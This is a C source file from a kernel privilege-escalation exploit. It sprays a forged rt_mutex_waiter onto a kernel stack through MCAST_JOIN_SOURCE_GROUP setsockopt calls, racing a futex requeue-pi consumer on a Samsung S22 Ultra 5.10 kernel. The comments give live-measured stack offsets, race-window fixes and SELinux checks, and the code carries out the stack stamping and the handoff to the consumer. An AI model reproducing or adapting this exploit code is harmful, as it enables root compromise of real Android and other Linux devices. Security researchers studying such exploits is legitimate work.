/*
 * exp32 stack stamper — sprays the payload onto the waiter's kernel
 * stack via MCAST_JOIN_SOURCE_GROUP setsockopt racing the consumer.
 * 32-bit only (see main.c).
 *
 * b0q (S22 Ultra, 5.10.226) geometry — measured live with gdb-mcp on the
 * running QEMU kernel (see MEMORY.md §7):
 *
 *   futex_wait_requeue_pi entry_sp = 0xffffffc00b26bd70
 *     rt_waiter = entry_sp - 0x1a0 + 0x90  = 0xffffffc00b26bc60
 *   do_ipv6_setsockopt   entry_sp = 0xffffffc00b26bd80 (compat path)
 *     gr32     = entry_sp - 0x2e0 + 0x168  = 0xffffffc00b26bc08
 *
 *   rt_waiter - gr32 = 0x58   (eureka/Quest3 was 0x34)
 *
 * so the 80-byte payload (v5.10 rt_mutex_waiter) starts at buffer+0x58.
 *
 * TCG race fix (observed live): each setsockopt call memsets gr32 to 0
 * BEFORE copying the user buffer (do_ipv6_setsockopt+560), so while this
 * thread is mid-call the stale waiter reads as all zeros — a consumer
 * firing then walks waiter->lock==0 and panics in raw_spin_trylock.
 * On bare metal that window is nanoseconds (Quest3 loops forever and
 * wins by probability); under TCG it is fatal.  So: stamp a bounded
 * number of times, then PARK IN USERSPACE (a pure spin — no syscall
 * frames, no more memsets), and only then release the consumer.  One
 * stable payload, one deterministic shot per child; retries use a fresh
 * child.
 *
 * HARD INVARIANT: no syscalls of any kind between the last stamp and
 * the park — not even a printf.  A write() to the console lands a
 * file_tty_write frame exactly on the waiter slot and tears the payload
 * (observed live via gdb-mcp, 2026-08-08).  Residual race: a CFS tick
 * preempting the parked spin leaves schedule() frames on the region
 * (put_prev_entity LR in waiter->lock) — nanosecond odds on device,
 * stretched under TCG; covered by per-attempt retries; eliminated on
 * the QEMU-root path by EXP32_RT (FIFO waiter is not tick-preempted).
 */
#define _GNU_SOURCE

#include <errno.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "kernelsnitch/utils.h"

#ifndef pr_debug
#define pr_debug(fmt, ...) ((void)0)
#endif

extern atomic_int g_consumer_go;

/* b0q: stale rt_waiter lands at stamp-buffer +0x58 (live-measured). */
#define EXP32_STAMP_OFF 0x58
/* v5.10 rt_mutex_waiter = 80 bytes */
#define EXP32_WAITER_BYTES 0x50
/* Enough stamps to be sure the full payload is what the last completed
 * call left on the stack; after the loop we never enter the kernel again. */
#define EXP32_STAMP_ROUNDS 64

void do_stamp_stack(uint64_t *buf){
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    uint8_t buffer[260];
    if (fd < 0) {
        pr_warning("do_stamp_stack: socket failed errno=%d\n", errno);
        _exit(1);   /* let the parent retry with a fresh child */
    }
    memcpy(buffer + EXP32_STAMP_OFF, buf, EXP32_WAITER_BYTES);

    /*
     * Probe ONE stamp and report it BEFORE the real loop.  After the last
     * setsockopt this thread must make NO more syscalls until the consumer
     * fires: any syscall re-enters the kernel on THIS stack and its frames
     * land right on the stale waiter, tearing the payload.  Observed live
     * (gdb-mcp, TRIG dump): a post-loop pr_warning()'s write() left a
     * file_tty_write frame on the slot (saved LR at waiter+0x18) between
     * the last stamp and the walk -> junk waiter->lock ->
     * rt_mutex_adjust_prio_chain+388 panic (device: waiter->lock=1).
     *
     * The stamp only lands if setsockopt reaches copy_group_source_from_sockptr
     * (the compat copy is what writes gr32 over the stale waiter).  An early
     * failure — e.g. SELinux denying setsockopt for the device shell context —
     * means NO copy and the consumer later walks the raw stale waiter.
     * errno distinguishes: EACCES = denied before the copy; EINVAL/
     * EADDRNOTAVAIL = late validation, copy already done (stamp landed).
     */
    errno = 0;
    {
        int rc = setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
                            buffer, 260);
        if (rc != 0 && errno == EACCES)
            pr_warning("stamp probe: EACCES — denied BEFORE the copy, "
                       "payload will NOT land\n");
        else if (rc != 0)
            pr_info("stamp probe: rc=%d errno=%d — late validation, "
                    "copy done (stamp lands)\n", rc, errno);
        else
            pr_info("stamp probe: setsockopt succeeded\n");
    }

    for (int i = 0; i < EXP32_STAMP_ROUNDS; i++)
        setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buffer, 260);

    /* Payload is parked: from here on this thread makes NO syscalls, so
     * nothing memsets or overwrites the waiter region again. */
    atomic_store(&g_consumer_go, 1);
    for (;;)
        __asm__ volatile("nop" ::: "memory");
}
